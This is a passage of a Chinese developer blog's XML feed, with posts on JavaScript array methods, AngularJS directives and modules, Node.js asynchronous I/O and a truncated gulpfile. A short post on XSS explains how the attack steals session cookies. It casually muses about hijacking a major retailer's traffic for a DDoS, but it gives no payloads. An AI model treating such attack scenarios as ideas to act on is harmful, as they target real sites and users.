提供了一种新的遍历的方法，`for...of`， 它比以上任何方法都强大易用。JS 为数组定义了5个迭代方法，这些方法都接收三个参数： 数组项的值，该项在数组中的位置，数组对象本身。##### erery()，some()对 every() 来说，传入的参数必需对每一项都返回 true，这个方法才返回 true；否则，返回false。而 some() 方法则只要传入的函数对数组中的某一项返回 true，就会返回 true。 var numbers = [1,2,4,5]; var everyResult = numbers.every(function(item,index,array){ return (item &gt; 2);}); alert(everyResult); // false var somerResult = numbers.some(function(item,index,array){ return (item &gt; 2);}); alert(someResult); // true;123##### filter()filter() 方法对查询某些符合条件的所有数组项非常有用。 var numbers = [1,2,6,4,78,12,34]; var filterResult = numbers.filter(function(item,index,array){ return (item &gt; 2); }); alert(filterResult); // 6,4,78,12,34 123##### map()map() 同样返回数组，而这个数组时在原始数组的基础上经过函数运行以后的数组项集合。 var numbers = [1,2,6,4,78,12,34]; var mapResult = numbers.map(function(item,index,array){ return (item*2) }); alert(mapResult);``` 本文更新日志:2016-9-25;2016-10-11;2016-12-25;2017-01-21;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[AngularJS(3)元素与事件指令]]></title>
      <url>%2F2017%2F01%2F21%2FAngularJS(3)%E5%85%83%E7%B4%A0%E4%B8%8E%E4%BA%8B%E4%BB%B6%E6%8C%87%E4%BB%A4%2F</url>
      <content type="text"><![CDATA[0x00 元素指令以下是用于在 DOM 中对元素进行配置和渲染样式的元素指令: ng-if: 从 DOM 中添加和移除元素； ng-class: 为元素设置 class 样式； ng-class-even: 对由 ng-repeat 指令生成的偶数元素设置 class 样式； ng-class-odd: 对由 ng-repeat 指令生成的奇数元素设置 class 样式； ng-hide: 在 DOM 中显示和隐藏元素； ng-show: 在 DOM 中显示和隐藏元素； ng-style: 设置一个或多个 CSS 属性。 ng-hide 和 ng-showng-hide 指令在表达式的值为 true 时将元素设置 display:none，从而隐藏元素,而 ng-show 在表达式的值为 false 时显示元素。 12&lt;span ng-hide=&quot;item.complete&quot;&gt;(Incomplete)&lt;/span&gt;&lt;span ng-show=&quot;item.complete&quot;&gt;(Done)&lt;/span&gt; 虽然，ng-hide 会将元素 CSS 样式设置为 display:none，从而实现了对用户的隐藏，但对浏览器而言并没有消失，它仍然在那儿，这有可能会对后续的 CSS 设置样式带来影响。 解决这个问题，可以使用 ng-if 来移除元素，而不仅仅是隐藏元素: 123&lt;!-- 使用 ng-if 指令模拟 ng-hide 和 hg-show 指令，以解决 后者带来的 CSS 样式问题--&gt;&lt;span ng-if=&quot;!item.complete&quot;&gt;(Incomplete)&lt;/span&gt;&lt;span ng-if=&quot;item.complete&quot;&gt;(Done)&lt;/span&gt; ng-if 和 ng-repeat但需要注意的是 ng-if 指令无法和 ng-repeat 指令应用在同一元素上，因为两者都依赖叫作嵌入包含的技术。这种情况之下可以使用 ng-repeat 和过滤器 $filter 来解决问题。 比如实现条纹表格: 123456789101112131415&lt;!--ng-if 和 ng-repeat 实现条纹表格--&gt;&lt;table class=&quot;table table-striped&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;#&lt;/th&gt; &lt;th&gt;Action&lt;/th&gt; &lt;th&gt;Done&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tr ng-repeat=&quot;item in todos | filter: &#123;complete: &apos;false&apos;&#125;&quot;&gt; &lt;td&gt;&#123;&#123;$index + 1&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;item.action&#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;item.complete&#125;&#125;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; ng-class 和 ng-style1234567&lt;tr ng-repeat=&quot;item in todos&quot; ng-class=&quot;settings.Rows&quot;&gt; &lt;td&gt;&#123;&#123;$index +1 &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;item.action&#125;&#125;&lt;/td&gt; &lt;td ng-style=&quot;&#123;&apos;background-color&apos;:settings.Columns&#125;&quot;&gt; &#123;&#123;item.complete&#125;&#125; &lt;/td&gt;&lt;/tr&gt; ng-class-even 和 ng-class-odd使用 ng-class-even 和 ng-class-odd 实现条纹表格: 1234567&lt;tr ng-repeat=&quot;item in todos&quot; ng-class-even=&quot;settings.Rows&quot;&gt; &lt;td&gt;&#123;&#123;$index +1 &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123;item.action&#125;&#125;&lt;/td&gt; &lt;td ng-class-odd=&quot;setting.Columns&quot;&gt; &#123;&#123;item.complete&#125;&#125; &lt;/td&gt;&lt;/tr&gt; 清单3-7%E4%BD%BF%E7%94%A8%E5%85%83%E7%B4%A0%E4%B8%8E%E4%BA%8B%E4%BB%B6%E6%8C%87%E4%BB%A4/%E6%B8%85%E5%8D%953-7.html) 0x01 事件指令以下是 AngularJS 1.6 中定义的事件指令: ng-blur ng-change ng-click ng-copy,ng-cut,ng-paste ng-dblick ng-focus ng-keydown,ng-keypress,ng-keyup ng-mousedown,ng-mouseenter,ng-mouseleave,ng-mousemove,ng-mouseover,ng-mouseup ng-submit 此外，AngularJS 还提供了简单的触摸事件和手势支持。 需要指出的的是在 AngularJS 1.6 中 mouseenter 事件被表示为 mouseover ，而 mouseleave 事件被表示为 mouseout。 12345678$scope.handleEvent = function (e) &#123; console.log(&quot;Event type:&quot; + e.type); $scope.data.columnColor = e.type == &quot;mouseover&quot; ? &quot;Green&quot; : &quot;Blue&quot;;&#125; &lt;tr ng-repeat=&quot;item in todos &quot; ng-class=&quot;data.rowColor&quot; ng-mouseenter=&quot;handleEvent($event)&quot; ng-mouseleave=&quot;handleEvent($event)&quot;&gt; 清单3-8%E4%BD%BF%E7%94%A8%E5%85%83%E7%B4%A0%E4%B8%8E%E4%BA%8B%E4%BB%B6%E6%8C%87%E4%BB%A4/%E6%B8%85%E5%8D%953-8.html) 创建自定义事件指令虽然 AngularJS 内置了很多事件指令，但是还不够，对于其未提供的事件便需要我们自己去创建了，比如 touch 指令。 12345678910angular.module(&quot;exampleApp&quot;, []) .controller(&quot;defaultCtrl&quot;, function ($scope) &#123; $scope.message = &quot;Tap Me!&quot;; &#125;).directive(&quot;tap&quot;, function () &#123; return function (scope, elem, attrs) &#123; elem.on(&quot;touchstart touchend&quot;, function () &#123; scope.$apply(attrs[&quot;tap&quot;]) &#125;) &#125; &#125;) 清单3-9%E4%BD%BF%E7%94%A8%E5%85%83%E7%B4%A0%E4%B8%8E%E4%BA%8B%E4%BB%B6%E6%8C%87%E4%BB%A4/%E6%B8%85%E5%8D%953-9.html) 0x03 布尔值指令 ng-checked: 管理 checked 属性，用于 input 元素; ng-disabled: 管理 disabled 属性，用于 input 和 button 元素; ng-readonly: 管理 readonly 属性，用于 input 元素; ng-selected: 管理 selecte 属性，用于 option 元素; ng-href: 在 a 元素上设置 href 属性； ng-src: 在 img 元素上设置 src 属性； ng-srcset: 在 img 元素上设置 srcset 属性。 当使用 ng-href 指令时，会在 AngularJS 处理完成以后再进行跳转，以防止用户跳转到错误目标位置。 清单3-10%E4%BD%BF%E7%94%A8%E5%85%83%E7%B4%A0%E4%B8%8E%E4%BA%8B%E4%BB%B6%E6%8C%87%E4%BB%A4/%E6%B8%85%E5%8D%953-10.html)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XSS]]></title>
      <url>%2F2017%2F01%2F19%2FXSS%2F</url>
      <content type="text"><![CDATA[0x00 XSSWeb 应用可以分成三层或者四层结构，客户端，服务器端，(应用程序)，数据库服务器。 早期利用 Javascript 可以使用验证用户输入合法性，或者提高用户的交互性体验，但是现代 Web 中的 Javascript 引用已经不仅限于此，因为 Node.js 的出现， JS 可以说统一了整个前后端的。 原理XSS（Cross-Site Scripting）跨站脚本攻击。Hack 的最终目标是客户端，但是 Hack 首先需要攻击某个服务器端，然后通过服务器端的推送，向客户端响应 Javascript 的恶意代码，盗取 session/cookie 等信息，或者利用客户端脚本进行重定向等攻击方式，从而实现对客户端的攻击。 当然 XSS 的攻击并不局限于 JS ，VBScript，ActiveX，或者 Flash等也是可以的。 攻击场景至于 XSS 攻击场景，取决于你的脑洞和实力，比如，当你拿到了 淘宝的服务器权限，你可以在双十一 凌晨12 点 通过 XSS 将淘宝的访问量转向百度，一次完美的超大规模的 DDoS 攻击。又或者，只是简单的通过借用淘宝的服务器向你的女神的电脑推送一个 Url，该 Url 指向的是一个你精心准备已久的网站。。。 XSS 类型 存储型 XSS (持久型)：Hacker 把自己的恶意 JS 注入到 服务器，当客服端访问服务器时，将其交互给客户端 反射型 XSS：反射型 XSS 需要结合社会工程学，比如 Hacker 首先向被攻击的目标客户端发送钓鱼邮件，该邮件中网址链接会向被攻陷的服务器端发送请求，然后通过注入到服务器端的而已 JS 代码，达到攻击目的。 DOM 型：DOM 型，其本质上也是存储型，利用浏览器的 DOM 特性，不需要向服务器端发送请求，而是直接在本地执行，从而窃取本地信息。 0x01 发现 XSSXSS 是具有明显特征的漏洞类型，与 SQL 注入类似，可以通过一些特征字符，变量，或者代码去验证，如果提交的内容被服务器原封不动的返回回来，那么，极大可能是存在 XSS 漏洞的。 反射性 存储型 DOM 型]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[AngularJS(1)概览]]></title>
      <url>%2F2017%2F01%2F18%2FAngularJS(1)%E6%A6%82%E8%A7%88%2F</url>
      <content type="text"><![CDATA[0x00 模块 module模块(module) 是 AngularJS 应用程序中的顶层组件。 AngularJS 中的模块主要有三种角色: 使用模块，可以将 AngularJS 应用程序与 HTML 文档中的一部分关联在一起，以此设置 AngularJS 应用程序的边界。 使用模块可以使用 AngularJS 的一些内置组件和自定义组件。 使用模块可以组织代码和管理组件。 0x00 创建模块模块通过 angular.module 方法定义，如下: 1var myApp = angular.module(&quot;exampleApp&quot;, []); module 方法接受三个参数： name: 模块名称。 requires: 模块所依赖的模块集合。 config: 该模块配置，等价于modeule.config 方法。 通常只使用前两个参数。 值得注意的是，模块创建和模块查找的区别,requires 参数在创建模块时是不可忽略的。依赖是必须添加的，即使没有依赖模块，也必须写上 [ ]。没有添加 requires 则会被认为是模块查找。 模块定义完成，还必须通过 ng-app 指令应用到 HTML 中在去。 1&lt;html ng-app=&quot;exampleApp&quot;&gt; 0x02 使用模块定义组件angular.module 方法将会返回一个 Module 对象，而 Module 对象包括如下属性和方法： animation(name, factory): 支持动画特性。 config(callback): 注册一个在模块加载时对该模块进行配置的函数。 constant(key, value): 定义一个返回常量的服务。 controller(name, constructor): 创建控制器。 directive(name, factory): 创建自定义指令。 factoty(name, provider: 创建一个服务。 service(name, constructor) : 创建一个服务。 provider(name, type: 创建服务。 filter(name, factory): 创建过滤器。 name: 返回模块名称。 run(callback): 注册一个在 AngularJS 加载完毕后用于对所有模块进行配置的函数。 value(name, value): 定义一个返回一常量的服务。 创建控制器控制器使用 Module.controller 创建，它接收两个参数: 控制器名称和一个工厂函数。 1234var myApp = angular.module(&quot;exampleApp&quot;, []);myApp.controller(&apos;firstCtrl&apos;, [&apos;$scope&apos;, function($scope)&#123; // do somthing&#125;]) 如上，我们创建了一个 firstCtrl 控制器，并注入了其对 $scope 服务的依赖。 依赖注入依赖很好理解，就是一个应用程序中的一些组件依赖于其它的组件。而依赖注入则简化了组件之间处理依赖的过程。AngularJS 通过在组件的工厂函数的参数中声明依赖，当然声明的依赖要与所依赖的组件相匹配。 控制器 扮演了 模型 和 视图 之间的渠道的角色。 Fluent APIModule 对象定义的方法返回的结果仍然是 Modeule 对象，这个简洁的特性使得我们可以使用 fulent API，即多个方法调用可以链式的连接在一起: 12345angular.module(&apos;exampleApp&apos;, []).constant(...).config(...).controller(...).controller(...) 创建指令AngularJS 内置了很多优秀的指令，但是如果仍然无法满足，便可以创建自己的自定义指令。 自定义指令通过 Module.directive 方法创建: 12345678910111213141516171819202122&lt;script&gt;var myApp = angular.module(&apos;exampleApp&apos;, []);myApp.controller(&apos;dayCtrl&apos;, function ($scope) &#123; var dayNames = [&apos;Sunday&apos;, &apos;Monday&apos;, &apos;Tuesday&apos;, &apos;Wednesday&apos;, &apos;Thursday&apos;, &apos;Friday&apos;, &apos;Saturday&apos;]; $scope.day = dayNames[new Date().getDay()];&#125;).directive(&apos;highlight&apos;, function () &#123; return function (scope, element, attrs) &#123; if (scope.day == attrs[&apos;highlight&apos;])&#123; element.css(&quot;color&quot;, &quot;red&quot;); &#125; &#125;&#125;)&lt;/script&gt;&lt;div class=&quot;panel&quot; ng-controller=&quot;dayCtrl&quot;&gt; &lt;div class=&quot;page-header&quot;&gt; &lt;h3&gt;AngularJS &lt;/h3&gt; &lt;/div&gt; &lt;h4 highlight=&quot;Wednesday&quot;&gt;Today is &#123;&#123;day || &quot;(unkown)&quot;&#125;&#125;&lt;/h4&gt;&lt;/div&gt; 如上 Module.directive 方法接收的两个参数是: 要创建的指令的名称和一个用于创建指令的工厂函数。 然后将该指令当做一个属性使用，而当 AngularJS 在 HTML 中遇到 highlight 属性时，会调用传给 directive 方法的工厂函数，而工厂函数将会传入三个参数给工人函数: 视图的作用域(scope), 指令所应用到的元素， 该元素的属性。 如上，如果 highlight 属性的值与作用域中的 day 变量的值相等，就会使用 element 参数来设置 HTML 的内容。 创建过滤器过滤器被用于视图，用来格式化需要显示的数据。过滤器一旦定义，就可以在整个模块中全面应用，以次保证跨多个控制器和视图之间的数据展示的一致性。 123456789101112131415161718192021222324&lt;div class=&quot;panel&quot; ng-controller=&quot;dayCtrl&quot;&gt; &lt;div class=&quot;page-header&quot;&gt; &lt;h3&gt;AngularJS &lt;/h3&gt; &lt;/div&gt; &lt;h4 highlight=&quot;Wednesday&quot;&gt;Today is &#123;&#123;day || &quot;(unkown)&quot; | dayName &#125;&#125;&lt;/h4&gt;&lt;/div&gt;&lt;script&gt;var myApp = angular.module(&apos;exampleApp&apos;, []);myApp.controller(&apos;dayCtrl&apos;, function ($scope) &#123; var dayNames = [&apos;Sunday&apos;, &apos;Monday&apos;, &apos;Tuesday&apos;, &apos;Wednesday&apos;, &apos;Thursday&apos;, &apos;Friday&apos;, &apos;Saturday&apos;]; $scope.day = new Date().getDay();&#125;)myApp.filter(&quot;dayName&quot;, function () &#123; var dayNames = [&apos;Sunday&apos;, &apos;Monday&apos;, &apos;Tuesday&apos;, &apos;Wednesday&apos;, &apos;Thursday&apos;, &apos;Friday&apos;, &apos;Saturday&apos;]; return function (input) &#123; return angular.isNumber(input) ? dayNames[input] : input; &#125;&#125;)&lt;/script&gt; AngularJS 提供了 声明式(通过 HTML) 和 命令式(通过 Javascript) 两种方式访问所创建的组件。 如上，我们使用的是声明访问构建的组件，如下，我们可以对我们的代码进行改造: 123456789myApp.directive(&apos;highlight&apos;, function ($filter) &#123; var dayFilter = $filter(&quot;dayName&quot;); return function (scope, element, attrs) &#123; if (dayFilter(scope.day) == attrs[&apos;highlight&apos;])&#123; element.css(&quot;color&quot;, &quot;red&quot;); &#125; &#125;&#125;) 我们对自定义指令 highlight 注入了 $filter 服务依赖，如此通过 $filter 服务便可以访问所有已定义的过滤器。 创建服务服务是一个单例对象，它所提供的功能可以被整个应用应用程序使用。比如，AngularJS 中一些内置的服务，$scope, $filter, $http。 关于单例对象: 即是只有一个对象会被 AngularJS 创建出来，并被程序需要服务的各个不同部分所分享 AngularJS 提供三种不同方法用以创建不同类型的服务: service, factory, provider。 以 service 为例，接收的两个参数是:服务名和创建服务对象的工厂函数。当 AngularJS 调用工厂函数时,会分配一个可通过 this 访问的新对象，而该对象中定义的属性可被全局访问到。 12345678myApp.controller(&apos;dayCtrl&apos;, function ($scope, days) &#123; var dayNames = [&apos;Sunday&apos;, &apos;Monday&apos;, &apos;Tuesday&apos;, &apos;Wednesday&apos;, &apos;Thursday&apos;, &apos;Friday&apos;, &apos;Saturday&apos;]; $scope.day = days.today;&#125;) myApp.service(&apos;days&apos;, function () &#123; this.today = new Date().getDay();&#125;) 如上，通过依赖注入来查找 days 服务从而将其作为参数传递给控制器的工厂函数，如此便可以访问 days 服务了。 定义值Module.value 方法用于创建返回固定值和对象的服务。只用 值服务 看似增加了不必要的复杂性，但是 AngularJS 会假设工厂函数的任意参数都声明了需要解析的依赖。 如果，不使用值服务，而写出如下代码将会报错: 1234var now = new Date();myApp.service(&apos;days&apos;, function (now)&#123; this.today = now.getDay();&#125;) 运行错误: 1Error: [$injector:unpr] Unknown provider: nowProvider &lt;- now &lt;- days 问题的原因在于，当调用工厂函数时，AngularJS 不会为 now 参数使用那个局部变量，当引用 now 变量时它已经不存在与 AngularJS 模块的作用域中了。 所以，最好的建议是使用并遵循 AngularJS 的创建值服务的方法。 0x03 使用模块组织代码任何 AngularJS 模块都可以依赖于在其他模块中定义的组件。比如，我们可以将上述定义的控制器，过滤器，服务，自定义指令等全部提取出来，放在单独的模块中去: 12345678910&lt;!-- controller.js --&gt; /** * Created by onejustone on 2017/1/18. */angular.module(&apos;exampleApp.Controllers&apos;, []).controller(&apos;dayCtrl&apos;, function ($scope, days) &#123; console.log(days) $scope.day = days.today;&#125;) 12345678910111213&lt;!-- filter.js --&gt;/** * Created by onejustone on 2017/1/18. */ angular.module(&apos;exampleApp.Filters&apos;, []).constant(&apos;dayNames&apos;, [&apos;Sunday&apos;, &apos;Monday&apos;, &apos;Tuesday&apos;, &apos;Wednesday&apos;, &apos;Thursday&apos;, &apos;Friday&apos;, &apos;Saturday&apos;]).filter(&apos;dayName&apos;, function (dayNames) &#123; return function (input) &#123; return angular.isNumber(input) ? dayNames[input] : input; &#125;&#125;) 1234567891011121314&lt;!-- directive.js --&gt;/** * Created by onejustone on 2017/1/18. */angular.module(&apos;exampleApp.Directive&apos;, []).directive(&apos;highlight&apos;, function ($filter) &#123; var dayFilter = $filter(&quot;dayName&quot;); return function (scope, element, attrs) &#123; if (dayFilter(scope.day) == attrs[&apos;highlight&apos;])&#123; element.css(&quot;color&quot;, &quot;red&quot;); &#125; &#125;&#125;) 12345&lt;!-- service.js --&gt;angular.module(&apos;exampleApp.Services&apos;, []).service(&apos;days&apos;, function (nowValue) &#123; this.today = nowValue.getDay();&#125;); 12345678910111213141516171819202122232425262728293031&lt;!-- example.html --&gt;&lt;!DOCTYPE html&gt;&lt;html ng-app=&quot;exampleApp&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;AngularJS Demo&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../sass/bootstrap.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../sass/bootstrap-theme.css&quot;&gt; &lt;script src=&quot;../angular.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;controller.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;filter.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;services.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;directive.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;panel&quot; ng-controller=&quot;dayCtrl&quot;&gt; &lt;div class=&quot;page-header&quot;&gt; &lt;h3&gt;AngularJS &lt;/h3&gt; &lt;/div&gt; &lt;h4 highlight=&quot;Wednesday&quot;&gt;Today is &#123;&#123;day || &quot;(unkown)&quot; | dayName &#125;&#125;&lt;/h4&gt;&lt;/div&gt; &lt;script&gt; var myApp = angular.module(&apos;exampleApp&apos;, [&apos;exampleApp.Services&apos;, &apos;exampleApp.Directive&apos;, &apos;exampleApp.Controllers&apos;, &apos;exampleApp.Filters&apos;]) var now = new Date(); myApp.value(&apos;nowValue&apos;, now); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 首先，对主模块声明依赖，将每个模块的名称添加到主模块的依赖数组中，当然前提是先引入了对应模块的 js 文件。 值得注意的是，这些模块并没有按照某种特定的顺序定义。而且 AngularJS 会自动加载定义在程序中的所有模块并解析依赖，将每个模块所包含的构件进行合并。如此，便可以使得无缝地使用来自其他模块的功能成为可能。而不必考虑模块间的依赖关系。 0x04 在模块生命周期工作Modeule.config 和 Module.run 方法注册了在 AngularJS 应用的生命周期的关键时刻所调用的函数。传给 config 方法的函数在当前模块被加载后调用，而 run 方法中的函数在所有模块加载完成以后被调用. 1234567891011121314&lt;!-- example.html --&gt;var myApp = angular.module(&apos;exampleApp&apos;, [&apos;exampleApp.Services&apos;, &apos;exampleApp.Directive&apos;, &apos;exampleApp.Controllers&apos;, &apos;exampleApp.Filters&apos;]);myApp.constant(&quot;startTime&quot;, new Date().toLocaleTimeString())myApp.config(function (startTime) &#123; console.log(&quot;Main module config:&quot; + startTime)&#125;);myApp.run(function (startTime) &#123; console.log(&quot;Main module run:&quot; + startTime)&#125;); 123456789&lt;!-- servies.js --&gt; angular.module(&apos;exampleApp.Services&apos;, []).service(&apos;days&apos;, function (nowValue) &#123; this.today = nowValue.getDay();&#125;).config(function (startTime) &#123; console.log(&quot;Services module config:&quot; + startTime);&#125;).run(function (startTime) &#123; console.log(&quot;Services module run: &quot; + startTime);&#125;); 如上，我们使用了 constant 方法，该方法与 value 值服务类似，但是使用 constant 创建的服务能作为 config 方法所声明的依赖（而值服务却不能）。 输出: 1234Services module config: (no time)Main module config:下午8:52:57Services module run: 下午8:52:57Main module run:下午8:52:57 本文源代码%E6%A6%82%E8%A7%88)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[深入浅出Node.js(2)异步I/O]]></title>
      <url>%2F2017%2F01%2F12%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BANode-js(2)%E5%BC%82%E6%AD%A5I-O%2F</url>
      <content type="text"><![CDATA[0x00 前言在众多的高级编程语言或运行平台中，将异步作为主要编程方式和设计理念的，Node 是首个。 而伴随异步 I/O 的还有事件驱动和单线程，它们构成 Node 的基调。 Node 创始人 Ryan Dahl 最初只是想要设计出一高性能的 Web 服务器，但后来却演变为了一个可以基于它构建各种高速，可伸缩网络应用的平台。 Web 是一个网，而 Node 犹如其名字一般，是网络中灵活的一个节点。 0x01 为何要异步 I/O异步 I/O 的期望是 I/O 的调用不再阻塞后续的运算，将原有的等待 I/O 完成的这段时间分配给其余的业务去执行。 可以说异步 I/O 是一种趋势，也是时代发展的必需，因为现代 Web 应用绝不是单凭一台服务器就可以完全胜任的，在跨网络的结构下，并发已是现代编程中的标配。 用户体验从用户体验而言，Javascript 是以单线程在浏览器中运行的，并且它还和 UI 渲染供用一个线程，这意味着在执行 javascript 代码的时候，UI 和响应是处于停滞状态的。 一旦对服务器发起资源请求，那么 javascript 必需要等到全部加载完成才能执行，而在这期间，UI 和 交互响应是处于阻塞状态的。但若采用异步请求，便可以在加载 javascript 代码的同时进行 UI渲染和响应用户交互。 资源分配我们所知道的是，单线程同步编程会因为阻塞 I/O 导致硬件资源得不到充分的使用。而多线程编程也因为编程中的死锁，状态同步等问题使得程序猿痛苦万分。 Node 在两者之间给出了它的方案： 利用单线程，远离多线程死锁，状态同步等问题；利用异步 I/O， 让单线程远离阻塞，以更好的使用 CPU 等硬件资源。 而为了弥补单线程无法利用多核心 CPU 的缺点，Node 提供了类似前端浏览器中 Web Workers 的子进程，该子进程可以通过工作进程高效的利用 CPI 和 I/O。 0x02 OS 异步 I/O 与非阻塞 I/O首先，对计算机内核而言,异步/同步和阻塞/非阻塞是两码事。 OS Kernel 对于 I/O 只有两种方式: 阻塞与非阻塞。在调用阻塞 I/O 时，应用程序需要等待 I/O 完成才能返回结果，这期间会包括磁盘寻道，读取数据，复制数据到内存整个 I/O 过程，在这期间会造成 CPU 等待，使得 CPU 性能得不到充分利用。为了提升性能，kernel 提供了非阻塞 I/O,非阻塞 I/O 在调用之后会立即返回，但返回的不是数据，而是状态。 非阻塞 I/O 返回之后，CPU 的时间片便可以用来处理其他事物，性能会得到明显提升，但由于完整的 I/O 并未完成，立即返回的并不是业务层期望的数据，而仅是当前调用的状态。而为了得到完成的数据，应用程序需要重复调用 I/O 操作来判断操作是否完成，我们把这种技术叫做 轮询 (Cment)。 任何技术都并非完美的。阻塞 I/O 造成 CPU 等待浪费，非阻塞需要轮询去确认是否完全完成数据获取，让 CPU 处理状态判断，是对 CPU 资源的浪费，同时对于应用程序而言，轮询技术仍然只能算是一种同步，因为 APP 仍然需要等待 I/O 完全返回，依旧会花费很多时间来等待，而等待期间，CPU 要么用于遍历文件描述符的状态，要么用于休眠等待事件的发生。 我们期望的完美的异步 I/O 应该是 APP 发起非阻塞调用，无序通过遍历或者事件唤醒等方式轮询，便可以直接处理下一个任务，只需在 I/O 完成以后通过信号或者回调将数据传递给 APP 即可。我们没必要将场景只限定在单线程状况下，通过让部分线程进行阻塞 I/O 或者非阻塞 I/O 加轮询技术来完成数据获取，让一个线程进行计算处理，通过线程之间的通信将 I/O 得到的数据进行传递，这就轻松实现了异步 I/O。对于这个技术的具体实现，在 Windows 下的异步 I/O 方案是 IOCP，而 Node 的异步调用模型与此也十分相似。 但由于 Windows 平台与 linux 平台的差异，Node 提供了 libuv 库作为抽象封装层，使得所有平台的兼容性的判断都有这一层来完成。 0x03 Node 的异步 I/O初步了解了 OS 对异步 I/O 的支持后，再来看看 Node 是如何实现异步 I/O 的。对于 Node 完成整个异步 I/O 的环节将涉及 事件循环,观察者,和 请求对象，而它们一起和 I/O线程池 构成了 Node 异步 I/O 模型的基本要素。 对于事件循环，正是它使得回调函数十分普遍，在进程启动时， Node 便会创建一个类似于 while 的循环体，每执行一次循环体的过程我们称为 Tick。 Tick 是一个过程，整个过程就是查看是否有事件待处理。而如何判断是否有事件待处理，就是观察者的任务了。 事件循环是一个典型的生产者/消费者模型。异步 I/O，网络请求等是事件的生产者，这些事件被传递到对应的观察者那里，事件循环则从观察者那里取出事件并处理。一个事件循环中有一个或多个观察者。 比如，一个 Node 中的经典调用场景，使用 fs.open() 打开一个文件，首先 Javascript 会调用 Node 的核心模块，核心模块调用 C++ 内建模块，内建模块通过 libuv 进行系统调用，然后当前 I/O 操作在线程池中等待执行，不管其是否阻塞 I/O,都不会影响到 Javascript 线程的执行，因为此时的 I/O 操作已经和 Javascript 不在同一个线程里了，自然不会影响到后续 Javascript 的执行，如此，便到达了异步的目的。 在 Node 中，除了 Javascript 是单线程外，Node 本身是多线程的，而除了用户代码无法并行执行之外，所有的 I/O（磁盘 I/O ，网络 I/O）都是可以并行执行的。 在上述的整个过程中，请求对象 作为异步 I/O 的中间产物，所有的状态都会保存其中，包括送入线程池等待执行以及 I/O 操作完成以后的回调处理。 执行回调组装好请求对象，送入 I/O 线程池等待执行，其实只是完成了异步 I/O 的第一步，回调通知是其二。 在回调通知的过程中还动用了事件循环和 I/O 观察者。每次执行 Tick，它都会调用系统的相关方法去检查线程池中是否有执行完的请求，若存在，会将请求对象加入到 I/O 观察者的队列中，然后将其当作事件处理。如果，I/O 操作完成，则将线程归还线程池，至此，整个异步 I/O 的流程全部结束。 0x04 非 I/O 的异步 API 定时器setTimeout() 和 setInterval() 与浏览器中的 API 是一致的，分别用于单次和多次定时执行任务，其实现原理与异步 I/O 类似，只是不需要 I/O 线程池的参与。 0x05 事件驱动与高性能服务器以下是几种经典的服务器模型: 同步式: 一次只能处理一个请求，并且其余请求都处于等待状态。 每进程/每请求: 为每个请求启动一进程，如此，虽然可以处理多个请求，但是不具备扩展性，因为系统资源是有限的。 每线程/每请求: 为每个请求启动一个线程来处理(比如 Apache)。虽然比每进程/每请求的方式要好，但是对于大型站点而言依然不够。 而 Node 就高级得多了，它采用事件驱动的方式处理请求，即是 通过主循环加事件触发的方式来运行程序。 无需为每一个请求创建额外的对应线程，可以省掉创建线程和销毁线程的开销，同时因为 OS 在调度任务时因为线程较少，切换上下文代价很低。如此，服务器可以顺畅的处理大量请求，这是 Node 高性能的原因之一。 与之相似的是 Nginx，它同样采用事件驱动，因此与 Node 具有很多相同的特性，但因其采用 C 编写，所以性能更高，但它仅适合做 Web 服务器，用于反向代理和负载均衡等服务。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[前端之坑(2)之CSS]]></title>
      <url>%2F2017%2F01%2F12%2F%E5%89%8D%E7%AB%AF%E4%B9%8B%E5%9D%91(2)%E4%B9%8BCSS%2F</url>
      <content type="text"></content>
    </entry>

    
    <entry>
      <title><![CDATA[gulpfile.js]]></title>
      <url>%2F2017%2F01%2F10%2Fgulpfile.js%2F</url>
      <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145//引入gulpvar gulp = require(&apos;gulp&apos;); //基础库var sass = require(&apos;gulp-ruby-sass&apos;); //sass/scss编译var uglify = require(&apos;gulp-uglify&apos;); //js压缩var imagemin = require(&apos;gulp-imagemin&apos;)var pngquant = require(&apos;imagemin-pngquant&apos;); //图片深度压缩var sourcemaps = require(&apos;gulp-sourcemaps&apos;); //来源地图//引入gulp插件var livereload = require(&apos;gulp-livereload&apos;); //网页自动刷新(服务器控制客户端同步刷新)var webserver = require(&apos;gulp-webserver&apos;); //本地服务var rename = require(&apos;gulp-rename&apos;); // 文件重命名var changed = require(&apos;gulp-changed&apos;); // 只操作有过修改的文件var concat = require(&apos;gulp-concat&apos;); //文件合并var clean = require(&apos;gulp-clean&apos;); //文件清理var minifyCss = require(&apos;gulp-minify-css&apos;); // CSS压缩var postcss = require(&apos;gulp-postcss&apos;); //var cssnano = require(&apos;gulp-cssnano&apos;); //用来压缩CSS的var autoprefixer = require(&apos;autoprefixer&apos;); //自动添加CSS3浏览器前缀//注册web服务任务gulp.task(&apos;webserver&apos;, function()&#123; gulp.src(&apos;./dist&apos;) //服务器目录(./代表根目录) .pipe(webserver(&#123; //运行gulp-webserver livereload:true, //启动LiveReload open:&apos;views/app/index.html&apos; //服务器启动时自动打开网页 port: 8877, 